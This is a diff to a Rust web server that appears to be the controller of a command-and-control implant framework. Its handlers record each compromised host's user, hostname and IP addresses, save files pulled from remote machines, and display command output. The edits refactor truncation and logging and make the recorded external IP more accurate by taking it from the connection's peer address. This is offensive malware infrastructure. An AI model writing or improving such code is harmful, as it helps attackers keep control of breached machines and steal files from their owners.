@@ -1,6 +1,5 @@
 use actix_web::{web, HttpRequest, HttpResponse, Responder};
 use base64::{engine::general_purpose::STANDARD, Engine as _};
-use colored::Colorize;
 use serde::{Deserialize, Serialize};
 use std::path::PathBuf;
 use std::sync::{Arc, Mutex};
@@ -152,14 +151,7 @@ fn parse_file_response(response: &str) -> Option<(String, String)> {
 /// Truncate a String to at most `max` bytes, preserving UTF-8 boundaries.
 fn truncate_field(mut s: String, max: usize) -> String {
     if s.len() > max {
-        // Truncate at a valid char boundary
-        let boundary = s
-            .char_indices()
-            .map(|(i, _)| i)
-            .take_while(|&i| i < max)
-            .last()
-            .unwrap_or(0);
-        s.truncate(boundary);
+        s.truncate(s.floor_char_boundary(max));
     }
     s
 }
@@ -183,7 +175,7 @@ fn save_download(link_name: &str, remote_path: &str, b64_content: &str) -> Resul
         .map_err(|e| format!("[-] Failed to decode file content: {}", e))?;
 
     let dest = dest_dir.join(&filename);
-    std::fs::write(&dest, &data).map_err(|e| format!("[-] Failed to write file: {}", e))?;
+    std::fs::write(&dest, data).map_err(|e| format!("[-] Failed to write file: {}", e))?;
 
     Ok(dest)
 }
@@ -219,7 +211,12 @@ pub async fn stage2_handler(
     let username = truncate_field(body.link_username.clone(), 256);
     let hostname = truncate_field(body.link_hostname.clone(), 256);
     let internal_ip = truncate_field(body.internal_ip.clone(), 45);
-    let external_ip = truncate_field(body.external_ip.clone(), 45);
+    // Prefer observed TCP peer address over implant-reported value (implant sends empty string).
+    let external_ip = req
+        .peer_addr()
+        .map(|a| a.ip().to_string())
+        .unwrap_or_else(|| body.external_ip.clone());
+    let external_ip = truncate_field(external_ip, 45);
     let platform = truncate_field(body.platform.clone(), 64);
 
     let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
@@ -429,12 +426,11 @@ pub async fn stage3_handler(
         crate::ui::print(&format!("║ {}", output));
         crate::ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(box_width)));
         tracing::info!(
-            "\n{}\n{}\n{}",
-            format!("╔{}{}╗", header_text, "═".repeat(pad))
-                .cyan()
-                .bold(),
+            "\n╔{}{}╗\n{}\n╚{}╝",
+            header_text,
+            "═".repeat(pad),
             output,
-            format!("╚{}╝", "═".repeat(box_width)).cyan().bold(),
+            "═".repeat(box_width),
         );
     }
 
